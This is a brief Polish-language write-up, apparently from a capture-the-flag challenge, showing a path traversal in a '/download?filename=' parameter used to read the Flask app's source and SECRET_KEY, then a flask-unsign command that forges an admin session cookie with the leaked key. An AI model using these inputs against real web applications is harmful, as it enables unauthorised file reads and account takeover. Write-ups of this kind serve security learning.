![](../images/Pasted%20image%2020220717180631.png)

Po szybkim przetestowaniu ścieżki `/download` okazuje się, że w parametrze `?filename` jest path traversal. Pobierając kod serwera (`/download?filename=/app/app.py`), można przeczytać SECRET_KEY flaska. 

Używając `flask-unsign -s --cookie "{'is_admin': True}" --secret "p5VAmUfaP71Zpy1g"` generujemy sesje administratora.

![](../images/Pasted%20image%2020220717183029.png)